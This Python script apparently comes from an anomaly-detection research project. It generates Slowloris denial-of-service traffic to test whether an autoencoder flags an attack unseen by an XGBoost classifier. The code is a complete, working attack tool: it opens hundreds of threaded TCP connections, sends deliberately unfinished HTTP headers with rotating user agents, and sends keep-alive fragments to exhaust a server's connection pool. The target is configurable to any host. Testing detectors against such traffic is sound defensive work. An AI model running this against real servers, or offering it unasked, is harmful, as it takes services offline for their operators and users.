#!/usr/bin/env python3
"""
gen_slowloris.py — Slowloris Attack Generator (UNKNOWN attack for zero-day test)
=================================================================================
Slowloris is a denial-of-service attack that works differently from SYN/UDP floods:

  HOW IT WORKS:
    1. Open many TCP connections to the target HTTP server
    2. Send a PARTIAL HTTP header (never complete it)
    3. Every ~10 seconds, send another header fragment to keep the connection alive
    4. Repeat — the server keeps the connection open waiting for the full request
    5. With enough connections, the server's connection pool is exhausted

  WHY IT IS AN UNKNOWN ATTACK FOR OUR MODEL:
    • XGBoost was never trained on slowloris flows
    • The flow shape is completely different from all known attacks:
        - Normal HTTP: short duration, 3-10 packets, 200-2000 bytes
        - BRUTE_FORCE:  short duration, 4-8 packets, fast pacing
        - DOS:          short duration, many packets, high byte rate
        - Slowloris:    VERY LONG duration, ~10 packets, near-zero byte rate
    • Autoencoder should flag it because the flow statistics are
      far outside the normal benign distribution

Usage:
    # Start the HTTP service first:
    python3 services/start_http_service.py &

    # Then run this generator:
    python3 attacks/gen_slowloris.py [--host 127.0.0.1] [--port 8080]
                                     [--connections 200] [--duration 60]
"""
import argparse
import random
import socket
import sys
import threading
import time

# ─────────────────────────────────────────────────────────────────────────────
# Slowloris connection worker
# ─────────────────────────────────────────────────────────────────────────────

# Fake user agents to vary the headers slightly
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
    "curl/7.88.1",
]

ENDPOINTS = ["/", "/login", "/api/data", "/dashboard", "/health"]


def slowloris_connection(host: str, port: int, duration: float,
                         keep_alive_interval: float, counters: dict,
                         lock: threading.Lock):
    """
    Single Slowloris connection:
    1. Connect
    2. Send partial HTTP headers
    3. Every `keep_alive_interval` seconds, send another header fragment
    4. Never complete the request
    5. Close after `duration` seconds
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(keep_alive_interval + 5)
        sock.connect((host, port))

        # Send partial HTTP request — missing the final \r\n\r\n
        endpoint = random.choice(ENDPOINTS)
        ua       = random.choice(USER_AGENTS)
        partial_headers = (
            f"GET {endpoint} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: text/html,application/xhtml+xml\r\n"
            f"Accept-Language: en-US,en;q=0.9\r\n"
            f"Connection: keep-alive\r\n"
            f"X-Custom-Header: {random.randint(1000, 9999)}\r\n"
            # intentionally NOT sending the final \r\n that completes the request
        ).encode()
        sock.send(partial_headers)

        with lock:
            counters["connected"] += 1

        end_time = time.time() + duration
        while time.time() < end_time:
            # Send a partial header fragment every interval to keep alive
            time.sleep(keep_alive_interval)
            try:
                fragment = f"X-Keep-Alive: {random.randint(1, 99999)}\r\n".encode()
                sock.send(fragment)
                with lock:
                    counters["keep_alives"] += 1
            except (socket.error, OSError):
                break

    except (socket.error, OSError, ConnectionRefusedError):
        with lock:
            counters["failed"] += 1
    finally:
        try:
            sock.close()
        except Exception:
            pass
        with lock:
            counters["closed"] += 1


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Slowloris attack generator — unknown attack for zero-day test"
    )
    parser.add_argument("--host",        default="127.0.0.1")
    parser.add_argument("--port",        type=int, default=8080)
    parser.add_argument("--connections", type=int, default=200,
                        help="Number of concurrent slow connections (default 200)")
    parser.add_argument("--duration",    type=int, default=60,
                        help="How long each connection stays open in seconds (default 60)")
    parser.add_argument("--interval",    type=float, default=10.0,
                        help="Seconds between keep-alive fragments per connection (default 10)")
    args = parser.parse_args()

    print("=" * 62)
    print("  SLOWLORIS Attack Generator")
    print("  (UNKNOWN attack — not in XGBoost training data)")
    print("=" * 62)
    print(f"  Target      : {args.host}:{args.port}")
    print(f"  Connections : {args.connections}")
    print(f"  Duration    : {args.duration}s per connection")
    print(f"  Interval    : {args.interval}s between header fragments")
    print(f"  Expected    : {args.connections} long-duration flows with")
    print(f"                very low packet rate → unusual for AE")
    print("=" * 62)

    # Verify target is reachable
    try:
        test = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test.settimeout(3)
        test.connect((args.host, args.port))
        test.close()
    except Exception:
        print(f"\n[ERROR] Cannot reach {args.host}:{args.port}")
        print(f"        Start the HTTP service first:")
        print(f"        python3 services/start_http_service.py &")
        sys.exit(1)

    counters = {"connected": 0, "keep_alives": 0, "failed": 0, "closed": 0}
    lock = threading.Lock()
    threads = []
    start_time = time.time()

    print(f"\n[SLOWLORIS] Opening {args.connections} slow connections...")

    # Stagger connection openings slightly to avoid overwhelming the kernel
    for i in range(args.connections):
        t = threading.Thread(
            target=slowloris_connection,
            args=(args.host, args.port, args.duration,
                  args.interval, counters, lock),
            daemon=True,
        )
        t.start()
        threads.append(t)
        time.sleep(0.05)   # 50ms stagger between connections

        if (i + 1) % 50 == 0:
            with lock:
                print(f"  [{i+1:>3}/{args.connections}] Connections opened: "
                      f"{counters['connected']}  Failed: {counters['failed']}")

    print(f"\n[SLOWLORIS] All connections open. Holding for {args.duration}s...")
    print(f"[SLOWLORIS] Sending keep-alive fragments every {args.interval}s\n")

    # Progress reporter
    check_interval = min(args.interval, 15)
    elapsed_total = 0
    while elapsed_total < args.duration + 5:
        time.sleep(check_interval)
        elapsed_total += check_interval
        elapsed = time.time() - start_time
        with lock:
            print(f"  [+{elapsed:4.0f}s] Active={counters['connected']-counters['closed']}  "
                  f"Keep-alives sent={counters['keep_alives']}  "
                  f"Failed={counters['failed']}")
        if elapsed_total > args.duration + args.interval:
            break

    for t in threads:
        t.join(timeout=2)

    elapsed = time.time() - start_time
    with lock:
        final = dict(counters)

    print("\n" + "=" * 62)
    print("  SLOWLORIS DONE")
    print("=" * 62)
    print(f"  Duration        : {elapsed:.1f}s")
    print(f"  Connections     : {final['connected']} opened")
    print(f"  Keep-alives     : {final['keep_alives']} fragments sent")
    print(f"  Failed          : {final['failed']}")
    print(f"\n  NFStream will see: ~{final['connected']} flows with:")
    print(f"    - Duration    : ~{args.duration}s each")
    print(f"    - Packets     : ~{int(args.duration / args.interval) + 2} per flow")
    print(f"    - Byte rate   : near-zero (just small header fragments)")
    print(f"    - Protocol    : TCP (6)")
    print(f"\n  These flow features are VERY different from benign HTTP")
    print(f"  → Autoencoder should flag these as ANOMALIES")
    print("=" * 62)


if __name__ == "__main__":
    main()
